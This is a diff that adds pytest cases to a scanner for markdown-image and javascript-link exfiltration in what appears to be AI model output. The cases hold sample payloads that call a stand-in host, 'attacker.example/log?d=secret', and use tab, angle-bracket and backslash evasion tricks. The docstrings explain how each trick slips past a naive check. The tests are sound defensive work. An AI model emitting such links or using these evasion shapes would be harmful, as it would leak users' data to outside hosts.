@@ -123,6 +123,110 @@ def test_protocol_relative_allowlisted_host_is_still_allowed():
     assert findings == []
 
 
+@pytest.mark.parametrize(
+    "destination",
+    [
+        "<https://attacker.example/log?d=secret>",
+        "< https://attacker.example/log >",
+        "https:\\\\attacker.example\\log",
+        "\\\\attacker.example\\log",
+    ],
+    ids=["angle-brackets", "angle-brackets-spaced", "backslash-scheme", "backslash-relative"],
+)
+def test_url_shapes_a_browser_resolves_are_not_missed(destination):
+    """CommonMark angle-bracket destinations and backslash forms both render to
+    a live <img src> in a real markdown renderer, and both previously produced
+    zero findings — the primary exfiltration path, silently open.
+
+    `angle-brackets-spaced` additionally requires `_MD_IMAGE`'s capture group
+    to span internal whitespace: the brief's original regex, run against this
+    exact case, captured only the leading "<" (its plain-token alternative
+    `[^)\\s]+` stops at the first space), which `_normalise_url` cannot
+    recognise as bracketed (doesn't end with ">"), so the destination fell
+    through unnormalised. `_MD_IMAGE`/`_MD_LINK` were widened to
+    `<[^<>]*>|[^)\\s]+` to capture the whole bracketed span.
+    """
+    findings = scan_exfil(f"See ![x]({destination})", allowlist=["cdn.nufi.me"])
+
+    assert [f.entity for f in findings] == ["EXTERNAL_IMAGE"]
+
+
+def test_angle_bracket_allowlisted_host_is_still_allowed():
+    findings = scan_exfil("![x](<https://cdn.nufi.me/logo.png>)", allowlist=["cdn.nufi.me"])
+
+    assert findings == []
+
+
+def test_tab_inside_angle_bracket_destination_is_still_caught():
+    """Real, CommonMark-valid exploit shape, found while inventing bypass
+    attempts against the new `_normalise_url` choke point.
+
+    CommonMark's *bracketed* destination grammar forbids unescaped `<`, `>`,
+    and line endings, but does not forbid a raw tab — so
+    `![x](<htt<TAB>ps://attacker.example/log>)` is valid markdown syntax
+    that a real renderer accepts, producing a destination string containing
+    a literal tab. A browser's WHATWG URL parser then strips all ASCII
+    tab/newline from that string before resolving it, fetching
+    `https://attacker.example/log`. Confirmed as a genuine, previously-open
+    gap before `_normalise_url` stripped tab/newline: this exact input
+    produced zero findings.
+
+    (An *unbracketed* `htt<TAB>ps://...` is a different, non-exploitable
+    case: CommonMark's plain-destination grammar explicitly excludes ASCII
+    control characters and spaces, so a real renderer would not treat it as
+    a valid link at all — not a live vector, and not tested here as one. A
+    raw newline is a line ending, forbidden by CommonMark even inside `<>`,
+    so it is not exploitable in either form either. `_normalise_url` strips
+    them anyway as low-risk defence-in-depth against renderers that are not
+    strictly CommonMark-compliant.)
+    """
+    output = "![x](<htt\tps://attacker.example/log?d=secret>)"
+
+    findings = scan_exfil(output, allowlist=["cdn.nufi.me"])
+
+    assert findings[0].entity == "EXTERNAL_IMAGE"
+
+
+def test_tab_inside_angle_bracket_javascript_link_is_still_caught():
+    """Same tab-stripping gap, on the JAVASCRIPT_URL path: a tab hidden
+    inside a bracketed link destination previously defeated the literal
+    `"javascript:"` substring check the same way it defeated the scheme
+    check on the image path — both go through the same `_normalise_url`
+    choke point now, so the same fix closes both at once."""
+    output = "[click](<java\tscript:alert(1)>)"
+
+    findings = scan_exfil(output, allowlist=[])
+
+    assert findings[0].entity == "JAVASCRIPT_URL"
+
+
+def test_angle_brackets_and_backslash_together_still_caught():
+    """`_normalise_url` applies three normalisations in a fixed order
+    (tab/newline strip, then angle-bracket unwrap, then backslash fold) —
+    a destination using two tricks at once must not slip through by
+    confusing that order."""
+    output = r"![x](<https:\\attacker.example\log?d=secret>)"
+
+    findings = scan_exfil(output, allowlist=["cdn.nufi.me"])
+
+    assert findings[0].entity == "EXTERNAL_IMAGE"
+
+
+def test_backslash_folded_host_that_merely_resembles_an_allowlisted_subdomain():
+    """After folding, `\\attacker.evil.cdn.nufi.me\\log` resolves to host
+    `attacker.evil.cdn.nufi.me` — a decoy built to *look* related to the
+    allowlisted `cdn.nufi.me`, but not equal to it or any suffix match logic
+    would need to exploit. Exact-match allowlist semantics (already covered
+    without backslashes by `test_subdomain_of_an_allowlisted_domain_is_not_
+    automatically_allowed`) must keep holding once the host arrives via
+    backslash-folding rather than literal forward slashes."""
+    output = r"![x](\\attacker.evil.cdn.nufi.me\log)"
+
+    findings = scan_exfil(output, allowlist=["cdn.nufi.me"])
+
+    assert findings[0].entity == "EXTERNAL_IMAGE"
+
+
 def test_protocol_relative_url_with_backslash_host_confusion_is_still_caught():
     """The two fixes touch adjacent code (`_is_external`'s scheme check and
     `_host_allowed`'s backslash normalisation) and must compose.
